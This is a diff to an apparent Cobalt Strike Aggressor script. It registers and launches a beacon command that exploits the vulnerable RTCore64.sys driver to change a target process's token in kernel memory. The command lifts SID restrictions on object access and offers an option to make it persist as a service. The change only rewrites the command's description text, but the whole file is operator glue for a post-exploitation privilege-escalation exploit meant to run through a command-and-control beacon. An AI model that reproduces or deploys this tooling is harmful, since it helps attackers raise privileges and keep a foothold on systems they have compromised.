@@ -1,8 +1,8 @@
 # author @mooolight
 
 beacon_command_register(
-	"byovd-rtcore64-tokenconf-unrestricttoken", "Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.",
-	"INFO:\nCapabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.\n\n" .
+	"byovd-rtcore64-tokenconf-unrestricttoken", "Allows access of the target process to any objects in the system usually proceeded by an "access denied" due to SID restriction by exploiting the vulnerable RTCore64.sys.",
+	"INFO:\nAllows access of the target process to any objects in the system usually proceeded by an "access denied" due to SID restriction by exploiting the vulnerable RTCore64.sys.\n\n" .
 	"ARGUMENTS:\n[<targetProc>]: Target process for the action parameter.\n[<pers>]: Set the status of the service' persistence.\n\n" .
 	"USAGE:\nbyovd-rtcore64-tokenconf-unrestricttoken <targetProc> <pers>\n\n".
 	"EXAMPLES:\nbyovd-rtcore64-tokenconf-unrestricttoken 7957 TRUE\n\n");
@@ -29,6 +29,6 @@ alias byovd-rtcore64-tokenconf-unrestricttoken {
     # Pack our arguments
     $arg_data  = bof_pack($bid,"zz",$targetProc,$pers);
 
-    blog($bid, "Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.");
+    blog($bid, "Allows access of the target process to any objects in the system usually proceeded by an "access denied" due to SID restriction by exploiting the vulnerable RTCore64.sys.");
     beacon_inline_execute($bid, $data, "go", $arg_data);
 }
